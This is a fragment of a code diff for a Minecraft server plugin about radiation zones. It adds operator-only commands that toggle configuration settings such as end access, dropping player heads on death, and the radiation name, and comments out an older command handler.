+                                Placeholder.component("allowed",
+                                        Component.text(allowed, color)));
+                        return Command.SINGLE_SUCCESS;
+                    })
+            )
+            .then(Commands.literal("dropPlayerHeadAtDeath")
+                    .then(Commands.argument("allow", BoolArgumentType.bool()))
+                        .requires(sender -> sender.getSender().isOp())
+                            .executes(ctx ->  {
+                                CommandSender sender = ctx.getSource().getSender();
+                                boolean allowed = ctx.getArgument("allow", boolean.class);
+
+                                config.set("dropPlayerHeadAtDeath", allowed);
+                                saveConfig();
+
+                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
+                                sender.sendRichMessage("dropPlayerHeadAtDeath is now set to <allowed>",
+                                        Placeholder.component("allowed",
+                                                Component.text(allowed, color)));
+                                return Command.SINGLE_SUCCESS;
+                            })
+            )
+            .then(Commands.literal("setLugolDurationTo")
+                    .then(Commands.argument("allow", BoolArgumentType.bool()))
+                        .requires(sender -> sender.getSender().isOp())
+                            .executes(ctx -> {
+                                CommandSender sender = ctx.getSource().getSender();
+                                boolean allowed = ctx.getArgument("allow", boolean.class);
+
+                                config.set("setLugolDurationTo", allowed);
+                                saveConfig();
+
+                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
+                                sender.sendRichMessage("setLugolDurationTo is now set to <allowed>",
+                                        Placeholder.component("allowed",
+                                                Component.text(allowed, color)));
+                                return Command.SINGLE_SUCCESS;
+                            })
+            )
+            .then(Commands.literal("endEnabled")
+                    .then(Commands.argument("allow", BoolArgumentType.bool()))
+                        .requires(sender -> sender.getSender().isOp())
+                            .executes(ctx -> {
+                                 CommandSender sender = ctx.getSource().getSender();
+                                 boolean allowed = ctx.getArgument("allow", boolean.class);
+
+                                 config.set("endEnabled", allowed);
+                                 saveConfig();
+
+                                 NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
+                                 sender.sendRichMessage("endEnabled is now set to <allowed>",
+                                         Placeholder.component("allowed",
+                                                 Component.text(allowed, color)));
+                                 return Command.SINGLE_SUCCESS;
+                    })
+            )
+            .then(Commands.literal("setRadiationName")
+                    .requires(sender -> sender.getSender().isOp())
+                        .then(Commands.argument("color", ArgumentTypes.namedColor()))
+                            .then(Commands.argument("name", StringArgumentType.string()))
+                                .executes(ctx -> {
+                                    CommandSender sender = ctx.getSource().getSender();
+                                    final NamedTextColor color = ctx.getArgument("color", NamedTextColor.class);
+                                    final String name = StringArgumentType.getString(ctx, "name");
+
+                                    config.set("setRadiationName", name);
+                                    saveConfig();
+
+                                    sender.sendRichMessage("Radiation is <name>",
+                                            Placeholder.component("name",
+                                                    Component.text(name, color)));
+                                    return Command.SINGLE_SUCCESS;
+                    })
+            )
+            .then(Commands.literal("WhatsSafeZoneSize")
+            )
+            .then(Commands.literal("chooseRadiation")
+            )
+            .build();
+
+    /*  @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         String commandName = command.getName();
         if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
@@ -710,7 +860,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
         }
         return true;
-    }
+    }*/
 
     public boolean getSafeZone(Player p, String regionName, int radius, int height) {
         Location loc = p.getLocation();
